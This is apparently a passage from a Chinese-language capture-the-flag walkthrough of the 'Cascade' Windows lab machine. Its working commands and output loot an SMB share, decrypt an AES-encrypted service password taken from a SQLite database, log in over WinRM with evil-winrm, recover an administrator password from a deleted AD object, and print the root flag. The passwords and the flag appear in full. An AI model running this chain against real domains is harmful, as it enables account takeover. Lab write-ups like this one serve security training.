  smbclient //10.129.26.199/Audit\$ -U 's.smith%sT333ve2' -W cascade.local \
    -c 'prompt OFF; recurse ON; mget *'
getting file \CascAudit.exe of size 13312 as CascAudit.exe (21.1 KiloBytes/sec) (average 21.1 KiloBytes/sec)
getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (23.8 KiloBytes/sec) (average 22.3 KiloBytes/sec)
getting file \RunAudit.bat of size 45 as RunAudit.bat (0.1 KiloBytes/sec) (average 15.8 KiloBytes/sec)
getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (265.3 KiloBytes/sec) (average 129.8 KiloBytes/sec)
getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (86.5 KiloBytes/sec) (average 111.7 KiloBytes/sec)
getting file \DB\Audit.db of size 24576 as DB/Audit.db (47.1 KiloBytes/sec) (average 105.7 KiloBytes/sec)
getting file \x64\SQLite.Interop.dll of size 1639936 as x64/SQLite.Interop.dll (398.1 KiloBytes/sec) (average 228.6 KiloBytes/sec)
getting file \x86\SQLite.Interop.dll of size 1246720 as x86/SQLite.Interop.dll (386.0 KiloBytes/sec) (average 267.6 KiloBytes/sec)
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/Cascade/Audit]
└─$ ls -liah
total 592K
2799032 drwxrwxr-x 5 kali kali 4.0K Aug 19 03:43 .
2792051 drwxrwxr-x 6 kali kali 4.0K Aug 19 03:43 ..
2799033 -rw-r--r-- 1 kali kali  13K Aug 19 03:43 CascAudit.exe
2799034 -rw-r--r-- 1 kali kali  12K Aug 19 03:43 CascCrypto.dll
2799035 drwxrwxr-x 2 kali kali 4.0K Aug 19 03:43 DB
2799036 -rw-r--r-- 1 kali kali   45 Aug 19 03:43 RunAudit.bat
2799037 -rw-r--r-- 1 kali kali 355K Aug 19 03:43 System.Data.SQLite.dll
2799048 -rw-r--r-- 1 kali kali 183K Aug 19 03:43 System.Data.SQLite.EF6.dll
2799072 drwxrwxr-x 2 kali kali 4.0K Aug 19 03:43 x64
2799081 drwxrwxr-x 2 kali kali 4.0K Aug 19 03:43 x86

```

连接数据库，查询到一个凭据。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade/Audit]
└─$ sqlite3 DB/Audit.db 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
DeletedUserAudit  Ldap              Misc            
sqlite> .schema
CREATE TABLE IF NOT EXISTS "Ldap" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "uname" TEXT,
        "pwd"   TEXT,
        "domain"        TEXT
);
CREATE TABLE sqlite_sequence(name,seq);
CREATE TABLE IF NOT EXISTS "Misc" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "Ext1"  TEXT,
        "Ext2"  TEXT
);
CREATE TABLE IF NOT EXISTS "DeletedUserAudit" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "Username"      TEXT,
        "Name"  TEXT,
        "DistinguishedName"     TEXT
);
sqlite> .headers on
sqlite> .mode colum
sqlite> SELECT * FROM ldap;
Id  uname   pwd                       domain       
--  ------  ------------------------  -------------
1   ArkSvc  BQO5l5Kj9MdErXx6Q6AGOw==  cascade.local

```

找到 IV。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade]
└─$ strings -el Audit/CascCrypto.dll
1tdyjCbY1Ix49842
CascCrypto.Resources
1tdyjCbY1Ix49842
VS_VERSION_INFO
VarFileInfo
Translation
StringFileInfo
000004b0
FileDescription
AesCrypto
FileVersion
1.0.0.0
InternalName
CascCrypto.dll
LegalCopyright
Copyright 
  2020
OriginalFilename
CascCrypto.dll
ProductName
AesCrypto
ProductVersion
1.0.0.0
Assembly Version
1.0.0.0
```

用 dnSpy 找到 KEY。

![](Pasted%20image%2020260819162802.png)

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade]
└─$ KEY=$(printf 'c4scadek3y654321' | xxd -p -c 256)
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/Cascade]
└─$ IV=$(printf '1tdyjCbY1Ix49842' | xxd -p -c 256)
```

解密。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade]
└─$ echo "BQO5l5Kj9MdErXx6Q6AGOw==" | base64 -d | openssl enc -d -aes-128-cbc -K "$KEY" -iv "$IV"                                                       w3lc0meFr31nd 
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade]
└─$ echo "ArkSvc:w3lc0meFr31nd" >> Users/ArkSvc
```

新账户有 winrm 权限。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade]
└─$ nxc winrm cascade.local -u ArkSvc -p 'w3lc0meFr31nd'           
WINRM       10.129.26.199   5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.26.199   5985   CASC-DC1         [+] cascade.local\ArkSvc:w3lc0meFr31nd (Pwn3d!)
```

登录。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade]
└─$ evil-winrm -i cascade.local -u ArkSvc -p 'w3lc0meFr31nd'                   
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami
cascade\arksvc
```

发现有回收站权限。

```bash
*Evil-WinRM* PS C:\Users\arksvc\Documents> net user arksvc
User name                    arksvc
Full Name                    ArkSvc
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:18:20 PM
Password expires             Never
Password changeable          1/9/2020 5:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 10:05:40 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

```

查询到 admin 的 base64 密码。

```bash
*Evil-WinRM* PS C:\Users\arksvc\Documents> Import-Module ActiveDirectory
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -Filter 'isDeleted -eq $true -and name -like "*TempAdmin*"' -IncludeDeletedObjects -Properties cascadeLegacyPwd | Select-Object -ExpandProperty cascadeLegacyPwd
YmFDVDNyMWFOMDBkbGVz
```

解密拿到 root flag。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade/Audit]
└─$ echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d          
baCT3r1aN00dles
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cascade]
└─$ evil-winrm -i cascade.local -u administrator -p baCT3r1aN00dles 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
26243664d997f28378144cd79119f1de

```
